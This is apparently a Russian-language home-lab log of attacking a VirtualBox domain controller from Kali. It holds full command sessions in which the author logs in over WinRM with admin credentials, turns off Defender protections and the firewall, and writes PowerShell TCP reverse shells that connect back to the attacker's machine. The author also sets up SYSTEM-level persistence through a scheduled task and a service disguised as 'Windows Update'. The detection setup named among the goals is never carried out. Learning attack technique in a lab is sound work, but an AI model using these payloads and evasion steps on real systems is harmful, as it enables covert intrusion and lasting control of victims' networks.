На сегодня цель:
Получить устойчивый удалённый доступ к контроллеру домена (не через планировщик задач, а через полноценную оболочку).

Закрепиться в системе (persistence) через создание службы или задачи в планировщике.

Настроить детекции в Wazuh для этих действий.

Перед началом проверим открытые порты через которые можем получить доступ
┌──(kali㉿kali)-[~]
└─$ nmap -p 5985,5986 10.10.10.200
Starting Nmap 7.98 ( https://nmap.org ) at 2026-08-27 05:49 -0400
Nmap scan report for 10.10.10.200
Host is up (0.00028s latency).

PORT     STATE    SERVICE
5985/tcp open     wsman
5986/tcp filtered wsmans
MAC Address: 08:00:27:6F:67:59 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.87 seconds
┌──(kali㉿kali)-[~]
└─$ nmap -p 3389 10.10.10.200
Starting Nmap 7.98 ( https://nmap.org ) at 2026-08-27 05:50 -0400
Nmap scan report for 10.10.10.200
Host is up (0.00037s latency).

PORT     STATE    SERVICE
3389/tcp filtered ms-wbt-server
MAC Address: 08:00:27:6F:67:59 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.04 seconds
           ┌──(kali㉿kali)-[~]
└─$ nmap -p 22 10.10.10.200
Starting Nmap 7.98 ( https://nmap.org ) at 2026-08-27 05:50 -0400
Nmap scan report for 10.10.10.200
Host is up (0.00022s latency).

PORT   STATE    SERVICE
22/tcp filtered ssh
MAC Address: 08:00:27:6F:67:59 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 0.83 seconds
Большинство портов в состоянии filtered

видим открытый 5985/tcp, его и используем

evil-winrm -i 10.10.10.200 -u testuser -p 'Test123!'
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                                                                                                                        
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\testuser\Documents> whoami
net localgroup administrators
cyberlab\testuser
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
Domain Admins
Enterprise Admins
The command completed successfully.

Доступ получен, мы теперь знаем какие у нас права, теперь закрепися в системе

*Evil-WinRM* PS C:\Users\testuser\Documents> $secpass = ConvertTo-SecureString "Test123!" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("CYBERLAB\testuser", $secpass)
$s = New-PSSession -ComputerName DC01 -Credential $cred
Invoke-Command -Session $s -ScriptBlock {
    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoP -NonI -W Hidden -Exec Bypass -Command `"`$client = New-Object System.Net.Sockets.TCPClient('10.10.10.100',4444);`$stream = `$client.GetStream();[byte[]]`$bytes = 0..65535|%{0};while((`$i = `$stream.Read(`$bytes, 0, `$bytes.Length)) -ne 0){;`$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(`$bytes,0, `$i);`$sendback = (iex `$data 2>&1 | Out-String );`$sendback2 = `$sendback + 'PS ' + (pwd).Path + '> ';`$sendbyte = ([text.encoding]::ASCII).GetBytes(`$sendback2);`$stream.Write(`$sendbyte,0,`$sendbyte.Length);`$stream.Flush()};`$client.Close()`""
    $trigger = New-ScheduledTaskTrigger -AtStartup
    $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
    Register-ScheduledTask -TaskName "WindowsUpdate" -Action $action -Trigger $trigger -Settings $settings -User "SYSTEM" -RunLevel Highest
}
At line:1 char:1
+ $secpass = ConvertTo-SecureString "Test123!" -AsPlainText -Force
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
This script contains malicious content and has been blocked by your antivirus software.
    + CategoryInfo          : ParserError: (:) [Invoke-Expression], ParseException
    + FullyQualifiedErrorId : ScriptContainedMaliciousContent,Microsoft.PowerShell.Commands.InvokeExpressionCommand

В связи с работой встроенной защиты так просто нам это не удалось, но мы всё ещё можем вручную отключить definder

*Evil-WinRM* PS C:\Users\testuser\Documents> Set-MpPreference -DisableRealtimeMonitoring $true
*Evil-WinRM* PS C:\Users\testuser\Documents> Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -DisableBehaviorMonitoring $true
Set-MpPreference -DisableBlockAtFirstSeen $true
Set-MpPreference -DisableScriptScanning $true
*Evil-WinRM* PS C:\Users\testuser\Documents> Get-MpComputerStatus | Select-Object RealTimeProtectionEnabled

RealTimeProtectionEnabled
-------------------------
                    False


*Evil-WinRM* PS C:\Users\testuser\Documents> $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoP -NonI -W Hidden -Exec Bypass -Command `"`$client = New-Object System.Net.Sockets.TCPClient('10.10.10.100',4444);`$stream = `$client.GetStream();[byte[]]`$bytes = 0..65535|%{0};while((`$i = `$stream.Read(`$bytes, 0, `$bytes.Length)) -ne 0){;`$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(`$bytes,0, `$i);`$sendback = (iex `$data 2>&1 | Out-String );`$sendback2 = `$sendback + 'PS ' + (pwd).Path + '> ';`$sendbyte = ([text.encoding]::ASCII).GetBytes(`$sendback2);`$stream.Write(`$sendbyte,0,`$sendbyte.Length);`$stream.Flush()};`$client.Close()`"
$trigger = New-ScheduledTaskTrigger -AtStartup
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
Register-ScheduledTask -TaskName "WindowsUpdate" -Action $action -Trigger $trigger -Settings $settings -User "SYSTEM" -RunLevel Highest
At line:4 char:117
+ ... Trigger $trigger -Settings $settings -User "SYSTEM" -RunLevel Highest
+                                                       ~~~~~~~~~~~~~~~~~~~
The string is missing the terminator: ".
    + CategoryInfo          : ParserError: (:) [Invoke-Expression], ParseException
    + FullyQualifiedErrorId : TerminatorExpectedAtEndOfString,Microsoft.PowerShell.Commands.InvokeExpressionCommand
*Evil-WinRM* PS C:\Users\testuser\Documents> $payload = '$client = New-Object System.Net.Sockets.TCPClient("10.10.10.100",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
$payload | Out-File -FilePath C:\Windows\Temp\payload.ps1
*Evil-WinRM* PS C:\Users\testuser\Documents> New-Service -Name "WinUpdateSvc" -BinaryPathName "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -NonI -W Hidden -Exec Bypass -File C:\Windows\Temp\payload.ps1" -DisplayName "Windows Update Service" -StartupType Automatic

Status   Name               DisplayName
------   ----               -----------
Stopped  WinUpdateSvc       Windows Update Service


*Evil-WinRM* PS C:\Users\testuser\Documents> schtasks /create /tn "WindowsUpdate" /tr "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -NonI -W Hidden -Exec Bypass -File C:\Windows\Temp\payload.ps1" /sc onstart /ru SYSTEM /rl HIGHEST
SUCCESS: The scheduled task "WindowsUpdate" has successfully been created.

не смотря на то что доступ должен быть открыт мы так и не связались сессией через nc -lvnp 4444

*Evil-WinRM* PS C:\Users\testuser\Documents> $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoP -NonI -W Hidden -Exec Bypass -Command `"`$client = New-Object System.Net.Sockets.TCPClient('10.10.10.100',4444);`$stream = `$client.GetStream();[byte[]]`$bytes = 0..65535|%{0};while((`$i = `$stream.Read(`$bytes, 0, `$bytes.Length)) -ne 0){;`$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(`$bytes,0, `$i);`$sendback = (iex `$data 2>&1 | Out-String );`$sendback2 = `$sendback + 'PS ' + (pwd).Path + '> ';`$sendbyte = ([text.encoding]::ASCII).GetBytes(`$sendback2);`$stream.Write(`$sendbyte,0,`$sendbyte.Length);`$stream.Flush()};`$client.Close()`"
$trigger = New-ScheduledTaskTrigger -AtStartup
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
Register-ScheduledTask -TaskName "WindowsUpdate" -Action $action -Trigger $trigger -Settings $settings -User "SYSTEM" -RunLevel Highest
At line:4 char:117
+ ... Trigger $trigger -Settings $settings -User "SYSTEM" -RunLevel Highest
+                                                       ~~~~~~~~~~~~~~~~~~~
The string is missing the terminator: ".
    + CategoryInfo          : ParserError: (:) [Invoke-Expression], ParseException
    + FullyQualifiedErrorId : TerminatorExpectedAtEndOfString,Microsoft.PowerShell.Commands.InvokeExpressionCommand
*Evil-WinRM* PS C:\Users\testuser\Documents> $payload = '$client = New-Object System.Net.Sockets.TCPClient("10.10.10.100",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
$payload | Out-File -FilePath C:\Windows\Temp\payload.ps1
*Evil-WinRM* PS C:\Users\testuser\Documents> New-Service -Name "WinUpdateSvc" -BinaryPathName "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -NonI -W Hidden -Exec Bypass -File C:\Windows\Temp\payload.ps1" -DisplayName "Windows Update Service" -StartupType Automatic

Status   Name               DisplayName
------   ----               -----------
Stopped  WinUpdateSvc       Windows Update Service


*Evil-WinRM* PS C:\Users\testuser\Documents> schtasks /create /tn "WindowsUpdate" /tr "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -NonI -W Hidden -Exec Bypass -File C:\Windows\Temp\payload.ps1" /sc onstart /ru SYSTEM /rl HIGHEST
SUCCESS: The scheduled task "WindowsUpdate" has successfully been created.
*Evil-WinRM* PS C:\Users\testuser\Documents> Get-ScheduledTask -TaskName "WindowsUpdate"
No MSFT_ScheduledTask objects found with property 'TaskName' equal to 'WindowsUpdate'.  Verify the value of the property and retry.
At line:1 char:1
+ Get-ScheduledTask -TaskName "WindowsUpdate"
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (WindowsUpdate:String) [Get-ScheduledTask], CimJobException
    + FullyQualifiedErrorId : CmdletizationQuery_NotFound_TaskName,Get-ScheduledTask
*Evil-WinRM* PS C:\Users\testuser\Documents> Get-ScheduledTask -TaskName "WindowsUpdate" | Select-Object State
No MSFT_ScheduledTask objects found with property 'TaskName' equal to 'WindowsUpdate'.  Verify the value of the property and retry.
At line:1 char:1
+ Get-ScheduledTask -TaskName "WindowsUpdate" | Select-Object State
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (WindowsUpdate:String) [Get-ScheduledTask], CimJobException
    + FullyQualifiedErrorId : CmdletizationQuery_NotFound_TaskName,Get-ScheduledTask
*Evil-WinRM* PS C:\Users\testuser\Documents> 

                                        
Warning: Press "y" to exit, press any other key to continue
*Evil-WinRM* PS C:\Users\testuser\Documents> $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoP -NonI -W Hidden -Exec Bypass -Command `"`$client = New-Object System.Net.Sockets.TCPClient('10.10.10.100',5555);`$stream = `$client.GetStream();[byte[]]`$bytes = 0..65535|%{0};while((`$i = `$stream.Read(`$bytes, 0, `$bytes.Length)) -ne 0){;`$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(`$bytes,0, `$i);`$sendback = (iex `$data 2>&1 | Out-String );`$sendback2 = `$sendback + 'PS ' + (pwd).Path + '> ';`$sendbyte = ([text.encoding]::ASCII).GetBytes(`$sendback2);`$stream.Write(`$sendbyte,0,`$sendbyte.Length);`$stream.Flush()};`$client.Close()`"
$trigger = New-ScheduledTaskTrigger -AtStartup
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
Register-ScheduledTask -TaskName "WindowsUpdateSrv" -Action $action -Trigger $trigger -Settings $settings -User "SYSTEM" -RunLevel Highest
At line:4 char:120
+ ... Trigger $trigger -Settings $settings -User "SYSTEM" -RunLevel Highest
+                                                       ~~~~~~~~~~~~~~~~~~~
The string is missing the terminator: ".
    + CategoryInfo          : ParserError: (:) [Invoke-Expression], ParseException
    + FullyQualifiedErrorId : TerminatorExpectedAtEndOfString,Microsoft.PowerShell.Commands.InvokeExpressionCommand
*Evil-WinRM* PS C:\Users\testuser\Documents> schtasks /create /tn "WindowsUpdateSrv" /tr "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command `"`$client = New-Object System.Net.Sockets.TCPClient('10.10.10.100',5555);`$stream = `$client.GetStream();[byte[]]`$bytes = 0..65535|%{0};while((`$i = `$stream.Read(`$bytes, 0, `$bytes.Length)) -ne 0){;`$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(`$bytes,0, `$i);`$sendback = (iex `$data 2>&1 | Out-String );`$sendback2 = `$sendback + 'PS ' + (pwd).Path + '> ';`$sendbyte = ([text.encoding]::ASCII).GetBytes(`$sendback2);`$stream.Write(`$sendbyte,0,`$sendbyte.Length);`$stream.Flush()};`$client.Close()`" /sc onstart /ru SYSTEM /rl HIGHEST
At line:1 char:45
+ ... ateSrv" /tr "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.ex ...
+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
The string is missing the terminator: ".
    + CategoryInfo          : ParserError: (:) [Invoke-Expression], ParseException
    + FullyQualifiedErrorId : TerminatorExpectedAtEndOfString,Microsoft.PowerShell.Commands.InvokeExpressionCommand
*Evil-WinRM* PS C:\Users\testuser\Documents> $payload = @'
$client = New-Object System.Net.Sockets.TCPClient('10.10.10.100',5555);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
};
$client.Close()
'@
$payload | Out-File -FilePath C:\Windows\Temp\rev.ps1
*Evil-WinRM* PS C:\Users\testuser\Documents> $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoP -NonI -W Hidden -Exec Bypass -File C:\Windows\Temp\rev.ps1"
$trigger = New-ScheduledTaskTrigger -AtStartup
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
Register-ScheduledTask -TaskName "WindowsUpdateSrv" -Action $action -Trigger $trigger -Settings $settings -User "SYSTEM" -RunLevel Highest

TaskPath                                       TaskName                          State
--------                                       --------                          -----
\                                              WindowsUpdateSrv                  Ready


*Evil-WinRM* PS C:\Users\testuser\Documents> schtasks /run /tn "WindowsUpdateSrv"
SUCCESS: Attempted to run the scheduled task "WindowsUpdateSrv".
*Evil-WinRM* PS C:\Users\testuser\Documents> 

Наш порт 4444 на Kali занят с реверсшеллом windows 10, перенастроили путь и принудительно запустили обновление и связь с портом 5555, после чего получили связь ┌──(kali㉿kali)-[~]
└─$ nc -lvnp 5555
listening on [any] 5555 ...
connect to [10.10.10.100] from (UNKNOWN) [10.10.10.200] 52647

Связь установлена, но мы не получили доступа к cmd, попробуем изменить способ связи

*Evil-WinRM* PS C:\Users\testuser\Documents> $payload2 = @'
$client = New-Object System.Net.Sockets.TCPClient('10.10.10.100',5555);
$stream = $client.GetStream();
$writer = New-Object System.IO.StreamWriter($stream);
$reader = New-Object System.IO.StreamReader($stream);
$process = New-Object System.Diagnostics.Process;
$process.StartInfo.FileName = "cmd.exe";
$process.StartInfo.UseShellExecute = $false;
$process.StartInfo.RedirectStandardInput = $true;
$process.StartInfo.RedirectStandardOutput = $true;
$process.StartInfo.RedirectStandardError = $true;
$process.StartInfo.CreateNoWindow = $true;
$process.Start();
$input = $process.StandardInput;
$output = $process.StandardOutput;
$error = $process.StandardError;
while ($true) {
    $line = $reader.ReadLine();
    if ($line -eq $null) { break };
    $input.WriteLine($line);
    $outputLine = $output.ReadLine();
    while ($outputLine -ne $null) {
        $writer.WriteLine($outputLine);
        $writer.Flush();
        $outputLine = $output.ReadLine();
    }
}
'@
$payload2 | Out-File -FilePath C:\Windows\Temp\rev2.ps1
*Evil-WinRM* PS C:\Users\testuser\Documents> $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoP -NonI -W Hidden -Exec Bypass -File C:\Windows\Temp\rev2.ps1"
$trigger = New-ScheduledTaskTrigger -AtStartup
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
Register-ScheduledTask -TaskName "WindowsUpdateSrv" -Action $action -Trigger $trigger -Settings $settings -User "SYSTEM" -RunLevel Highest -Force

TaskPath                                       TaskName                          State
--------                                       --------                          -----
\                                              WindowsUpdateSrv                  Running


*Evil-WinRM* PS C:\Users\testuser\Documents> schtasks /run /tn "WindowsUpdateSrv"
INFO: scheduled task "WindowsUpdateSrv" is currently running.
SUCCESS: Attempted to run the scheduled task "WindowsUpdateSrv".
*Evil-WinRM* PS C:\Users\testuser\Documents> schtasks /run /tn "WindowsUpdateSrv"
SUCCESS: Attempted to run the scheduled task "WindowsUpdateSrv".
*Evil-WinRM* PS C:\Users\testuser\Documents> schtasks /stop /tn "WindowsUpdateSrv"
schtasks.exe : ERROR: Invalid argument/option - '/stop'.
    + CategoryInfo          : NotSpecified: (ERROR: Invalid ...tion - '/stop'.:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
*Evil-WinRM* PS C:\Users\testuser\Documents> schtasks /end /tn "WindowsUpdateSrv"
SUCCESS: The scheduled task "WindowsUpdateSrv" has been terminated successfully.
*Evil-WinRM* PS C:\Users\testuser\Documents> schtasks /run /tn "WindowsUpdateSrv"
SUCCESS: Attempted to run the scheduled task "WindowsUpdateSrv".
*Evil-WinRM* PS C:\Users\testuser\Documents> schtasks /run /tn "WindowsUpdateSrv"
INFO: scheduled task "WindowsUpdateSrv" is currently running.
SUCCESS: Attempted to run the scheduled task "WindowsUpdateSrv".
*Evil-WinRM* PS C:\Users\testuser\Documents> netsh advfirewall set allprofiles state off
Ok.

*Evil-WinRM* PS C:\Users\testuser\Documents> Get-Content C:\Windows\Temp\rev2.ps1
$client = New-Object System.Net.Sockets.TCPClient('10.10.10.100',5555);
$stream = $client.GetStream();
$writer = New-Object System.IO.StreamWriter($stream);
$reader = New-Object System.IO.StreamReader($stream);
$process = New-Object System.Diagnostics.Process;
$process.StartInfo.FileName = "cmd.exe";
$process.StartInfo.UseShellExecute = $false;
$process.StartInfo.RedirectStandardInput = $true;
$process.StartInfo.RedirectStandardOutput = $true;
$process.StartInfo.RedirectStandardError = $true;
$process.StartInfo.CreateNoWindow = $true;
$process.Start();
$input = $process.StandardInput;
$output = $process.StandardOutput;
$error = $process.StandardError;
while ($true) {
    $line = $reader.ReadLine();
    if ($line -eq $null) { break };
    $input.WriteLine($line);
    $outputLine = $output.ReadLine();
    while ($outputLine -ne $null) {
        $writer.WriteLine($outputLine);
        $writer.Flush();
        $outputLine = $output.ReadLine();
    }
}
*Evil-WinRM* PS C:\Users\testuser\Documents> 

Увы это тоже не помогло, попробуем создать другой скрипт

*Evil-WinRM* PS C:\Users\testuser\Documents> $payload3 = @'
$client = New-Object System.Net.Sockets.TCPClient('10.10.10.100',5555);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
};
$client.Close()
'@
$payload3 | Out-File -FilePath C:\Windows\Temp\rev3.ps1
*Evil-WinRM* PS C:\Users\testuser\Documents> schtasks /end /tn "WindowsUpdateSrv"
SUCCESS: The scheduled task "WindowsUpdateSrv" has been terminated successfully.
*Evil-WinRM* PS C:\Users\testuser\Documents> $payload3 = @'
$client = New-Object System.Net.Sockets.TCPClient('10.10.10.100',5555);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
};
$client.Close()
'@
$payload3 | Out-File -FilePath C:\Windows\Temp\rev3.ps1
*Evil-WinRM* PS C:\Users\testuser\Documents> $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoP -NonI -W Hidden -Exec Bypass -File C:\Windows\Temp\rev3.ps1"
$trigger = New-ScheduledTaskTrigger -AtStartup
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
Register-ScheduledTask -TaskName "WindowsUpdateSrv" -Action $action -Trigger $trigger -Settings $settings -User "SYSTEM" -RunLevel Highest -Force

TaskPath                                       TaskName                          State
--------                                       --------                          -----
\                                              WindowsUpdateSrv                  Ready


*Evil-WinRM* PS C:\Users\testuser\Documents> Set-ExecutionPolicy Bypass -Scope Process -Force
*Evil-WinRM* PS C:\Users\testuser\Documents> schtasks /run /tn "WindowsUpdateSrv"
SUCCESS: Attempted to run the scheduled task "WindowsUpdateSrv".

у нас вновь не получилось, проверим видимость

*Evil-WinRM* PS C:\Users\testuser\Documents> Test-NetConnection -ComputerName 10.10.10.100 -Port 5555
Warning: TCP connect to (10.10.10.100 : 5555) failed


ComputerName           : 10.10.10.100
RemoteAddress          : 10.10.10.100
RemotePort             : 5555
InterfaceAlias         : Ethernet 2
SourceAddress          : 10.10.10.200
PingSucceeded          : True
PingReplyDetails (RTT) : 0 ms
TcpTestSucceeded       : False

проблема не в скрипте, а в том, что Windows Server не может подключиться к Kali на порт 5555. Это видно из вывода Test-NetConnection: TcpTestSucceeded: False. Причина почти всегда одна — брандмауэр на Kali блокирует входящие соединения, либо Ncat не слушает на всех интерфейсах.

Попробуем остановить слушатель и проверить Ncat

┌──(kali㉿kali)-[~]
└─$ nc -lvnp 5555
listening on [any] 5555 ...
connect to [10.10.10.100] from (UNKNOWN) [10.10.10.200] 56710
sudo ss -tlnp | grep 5555
PS C:\Windows\system32> 

Странно но после ввода команды без остановки слушателя сы получили доступ
Всё дело в том что nc не обновляет вывод автоматически, но когда я нажал Enter или переключился, терминал показал новое состояние.

Следующий шаг: закрепление в системе

Создали задачу в планировщике и запустили для проверки
*Evil-WinRM* PS C:\Users\testuser\Documents> $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoP -NonI -W Hidden -Exec Bypass -File C:\Windows\Temp\rev4.ps1"
$trigger = New-ScheduledTaskTrigger -AtStartup
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
Register-ScheduledTask -TaskName "WindowsUpdateSrv" -Action $action -Trigger $trigger -Settings $settings -User "SYSTEM" -RunLevel Highest -Force

TaskPath                                       TaskName                          State
--------                                       --------                          -----
\                                              WindowsUpdateSrv                  Running


*Evil-WinRM* PS C:\Users\testuser\Documents> Get-ScheduledTask -TaskName "WindowsUpdateSrv"

TaskPath                                       TaskName                          State
--------                                       --------                          -----
\                                              WindowsUpdateSrv                  Running


*Evil-WinRM* PS C:\Users\testuser\Documents> Start-ScheduledTask -TaskName "WindowsUpdateSrv"

Увы я сам уже заблудился в созданых файлах и десятках перезапусках системы так что отчёт сгенерирован ии

Итоговый отчёт по закреплению в системе (Persistence)
1. Цель
Закрепиться в контроллере домена (10.10.10.200) с помощью reverse shell, который будет автоматически запускаться при старте системы, чтобы обеспечить постоянный удалённый доступ.

2. Используемые инструменты и методы
Evil-WinRM — для первичного доступа через учётные данные testuser (Domain Admin).

Reverse Shell PowerShell — скрипт rev4.ps1, подключающийся к Kali (10.10.10.100) на порт 5555.

Планировщик задач Windows — для автозапуска при старте системы (триггер AtStartup).

BAT-файл — для добавления задержки перед запуском скрипта (чтобы сеть успела инициализироваться).

3. Конечная конфигурация
Файл reverse shell: C:\Windows\Temp\rev4.ps1

Содержит рабочий код PowerShell для обратного TCP-соединения.

BAT-файл-обёртка: C:\Windows\Temp\start.bat

Содержит:

text
@echo off
ping -n 30 127.0.0.1 >nul
powershell.exe -NoP -NonI -W Hidden -ExecutionPolicy Bypass -File C:\Windows\Temp\rev4.ps1
Задержка 30 секунд гарантирует, что сетевой стек будет готов к соединению.

Задача планировщика: WindowsUpdateSrv

Действие: запуск C:\Windows\Temp\start.bat

Триггер: при старте системы (AtStartup)

Пользователь: SYSTEM (наивысшие права)

Состояние: Ready, включена.

4. Проверка
Ручной запуск задачи (Start-ScheduledTask -TaskName "WindowsUpdateSrv") даёт немедленное соединение с Kali.

После перезагрузки сервера соединение устанавливается автоматически через 30–40 секунд после старта системы.

Это подтверждает, что закрепление работает стабильно.

Проблема	Решение
schtasks не принимал триггер с задержкой напрямую через CMD	Создали BAT-файл с встроенной задержкой ping -n 30.
Служба не запускалась из-за marked for deletion	Перезагрузили сервер, удалили службу и создали задачу вместо неё.
Файл rev4.ps1 отсутствовал после перезагрузки (лабораторная ошибка)	Заново создали файл, дали права SYSTEM.
Команды echo в PowerShell давали некорректный BAT-файл	Использовали многострочный @" ... "@ с Out-File.
7. Вывод
Доступ к контроллеру домена получен и закреплён. Система будет автоматически подключаться к атакующей машине при каждой загрузке. Это демонстрирует реальный сценарий продвинутой атаки с использованием легитимных средств Windows (планировщик задач, PowerShell) в обход стандартных средств защиты.